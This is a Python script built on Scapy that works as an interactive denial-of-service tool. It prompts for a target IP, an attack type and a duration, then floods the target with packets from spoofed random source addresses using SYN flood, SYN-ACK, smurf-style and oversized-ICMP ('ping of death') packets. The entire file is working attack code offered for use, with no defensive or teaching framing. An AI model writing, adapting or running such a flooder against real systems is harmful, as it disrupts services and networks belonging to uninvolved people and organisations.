from scapy.all import IP, ICMP, TCP, send, Raw, conf
import random
import time
import sys

def generate_random_ip():
    """Generates a random valid IP address."""
    return '.'.join(str(random.randint(1, 254)) for _ in range(4))

conf.verb = 0  # Disable Scapy's output messages

try:
    target_ip = input("Target IP: ")  # Get the target IP from the user
    attack_type = input("Attack type (syn_flood, syn_ack, smurf, pod): ").lower()  # Get the attack type

    # Check if the provided attack type is valid
    if attack_type not in ["syn_flood", "syn_ack", "smurf", "pod"]:
        print("Unrecognized attack type.")
        sys.exit(1)

    duration = float(input("Duration of the attack (in seconds): "))  # Get the attack duration from the user
    start_time = time.time()  # Record the start time of the attack

    # Loop until the specified duration has passed
    while time.time() - start_time < duration:
        src_ip = generate_random_ip()  # Generate a random source IP address

        # Construct packets based on the specified attack type
        if attack_type == "syn_flood":
            # Create a SYN packet
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=80, flags="S")

        elif attack_type == "syn_ack":
            # Create a SYN-ACK packet
            packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535), dport=80, flags="SA")

        elif attack_type == "smurf":
            # Create an ICMP packet with the target IP as the destination
            packet = IP(src=target_ip, dst=src_ip) / ICMP()

        elif attack_type == "pod":
            # Create a Ping of Death packet with a large payload
            packet = IP(src=src_ip, dst=target_ip) / ICMP() / Raw(b"A" * 6000)

        send(packet)  # Send the constructed packet

    print(f"All packets for the {attack_type} attack have been sent to {target_ip}.")

except KeyboardInterrupt:
    print("\nStopped by the user.")  # Handle user interruption
    sys.exit(0)

except ValueError:
    print("Please enter valid numeric values.")  # Handle invalid numeric input
    sys.exit(1)
